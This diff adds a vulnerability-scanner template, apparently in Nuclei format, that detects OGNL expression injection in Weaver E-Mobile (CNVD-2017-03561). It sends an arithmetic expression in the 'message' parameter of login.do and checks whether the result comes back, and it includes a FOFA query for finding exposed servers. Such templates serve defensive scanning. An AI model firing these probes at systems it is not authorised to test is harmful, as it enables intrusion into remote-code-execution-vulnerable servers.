@@ -1,0 +1,39 @@
+id: weaver-emobile-message-ognl-inject
+info:
+  name: 泛微 E-Mobile message OGNL 表达式注入
+  author: ritikchaddha,leadlife
+  severity: critical
+  description: 
+  classification:
+    cve-id: CNVD-2017-03561
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="泛微-EMobile" && icon_hash="1578525679"
+  tags: weaver,emobile,rce,oa
+
+variables:
+  num1: "{{rand_int(800000, 999999)}}"
+  num2: "{{rand_int(800000, 999999)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/login.do?message={{num1}}*{{num2}}"
+      - "{{BaseURL}}/login/login.do?message={{num1}}*{{num2}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{result}}"
+
+      - type: status
+        status:
+          - 200
+
+          
